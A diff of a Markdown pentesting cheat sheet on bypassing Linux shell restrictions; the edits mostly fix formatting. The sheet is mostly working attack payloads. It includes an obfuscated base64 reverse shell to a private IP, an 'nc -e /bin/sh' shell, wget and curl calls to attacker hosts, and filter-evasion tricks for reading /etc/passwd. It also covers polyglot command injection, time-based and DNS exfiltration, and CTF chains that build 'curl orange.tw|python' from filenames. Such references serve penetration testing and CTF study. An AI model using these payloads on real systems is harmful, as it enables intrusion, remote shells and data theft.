@@ -1,6 +1,5 @@
 # Bypass Linux Restrictions
 
-
 ## Common Limitations Bypasses
 
 ### Reverse Shell
@@ -10,7 +9,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-```
+
 ### Short Rev shell
 
 ```bash
@@ -20,7 +19,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-```
+
 ### Bypass Paths and forbidden words
 
 ```bash
@@ -74,7 +73,7 @@ g # These 4 lines will equal to ping
 
 # Fake commands
 p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
-w`u`h`u`o`u`a`u`m`ui # Equals to whoami but 5 errors trying to execute "u" are shown
+w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown
 
 # Concatenation of strings using history
 !-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
@@ -82,7 +81,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-```
+
 ### Bypass forbidden spaces
 
 ```bash
@@ -97,7 +96,7 @@ cat$IFS/etc/passwd # cat /etc/passwd
 # Put the command line in a variable and then execute it
 IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
 IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
-IFS=,;`cat<<<cat,/etc/passwd # Using cat twice
+IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
 #  Other way, just change each space for ${IFS}
 echo${IFS}test
 
@@ -111,60 +110,60 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-```
+
 ### Bypass backslash and slash
 
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-```
+
 ### Bypass pipes
 
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-```
+
 ### Bypass with hex encoding
 
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
-cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
 abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
-`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
-cat `xxd -r -p <<< 2f6574632f706173737764
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
-cat `xxd -r -ps <(echo 2f6574632f706173737764)
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-```
+
 ### Bypass IPs
 
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-```
+
 ### Time based data exfiltration
 
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-```
+
 ### Getting chars from Env Variables
 
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-```
+
 ### DNS data exfiltration
 
-You could use **burpcollab** or [[http://pingb.in|**pingb**]] for example.
+You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
 
 ### Builtins
 
-In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [[https://twitter.com/devploit|**devploit**]].\
-First of all check all the [[https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html|**shell builtins**]]**.** Then here you have some **recommendations**:
+In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [**devploit**](https://twitter.com/devploit).\
+First of all check all the [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Then here you have some **recommendations**:
 
 ```bash
 # Get list of builtins
@@ -217,34 +216,34 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-```
+
 ### Polyglot command injection
 
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
-/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/**/
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-```
+
 ### Bypass potential regexes
 
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
-1%0a`curl http://attacker.com
+1%0a`curl http://attacker.com`
 ```
-```
+
 ### Bashfuscator
 
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-```
+
 ### RCE with 5 chars
 
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
-## Step 1: generate `ls -t>g to file "_" to be able to execute ls ordening names by cration date
+## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
 http://host/?cmd=>ls\
 http://host/?cmd=ls>_
 http://host/?cmd=>\ \
@@ -252,7 +251,7 @@ http://host/?cmd=>-t\
 http://host/?cmd=>\>g
 http://host/?cmd=ls>>_
 
-## Step2: generate `curl orange.tw|python to file "g"
+## Step2: generate `curl orange.tw|python` to file "g"
 ## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
 http://host/?cmd=>on
 http://host/?cmd=>th\
@@ -272,6 +271,7 @@ http://host/?cmd=sh _
 ## Finally execute the file "g"
 http://host/?cmd=sh g
 
+
 # Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
 # Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
 https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
@@ -286,12 +286,12 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-```
+
 ### RCE with 4 chars
 
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
-# it will follow the same principle of creating the command `ls -t>g in a file
+# it will follow the same principle of creating the command `ls -t>g` in a file
 # and then generate the full command in filenames
 # generate "g> ht- sl" to file "v"
 '>dir'
@@ -323,7 +323,7 @@ ln /f*
 'sh x'
 'sh g'
 ```
-```
+
 ## Read-Only/Noexec/Distroless Bypass
 
 If you are inside a filesystem with the **read-only and noexec protections** or even in a distroless container, there are still ways to **execute arbitrary binaries, even a shell!:**
@@ -345,7 +345,7 @@ Therefore you can create a *NOP sled for Bash* by prefixing your real command wi
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-```
+
 If a ROP chain (or any memory-corruption primitive) lands the instruction pointer anywhere within the space block, the Bash parser simply skips the whitespace until it reaches `nc`, executing your command reliably.
 
 Practical use cases:
@@ -358,12 +358,10 @@ Practical use cases:
 
 ## References & More
 
-- [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits|https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits]]
-- [[https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet|https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet]]
-- [[https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0|https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0]]
+- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
-- [[https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/|Exploiting zero days in abandoned hardware – Trail of Bits blog]]
-
-
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
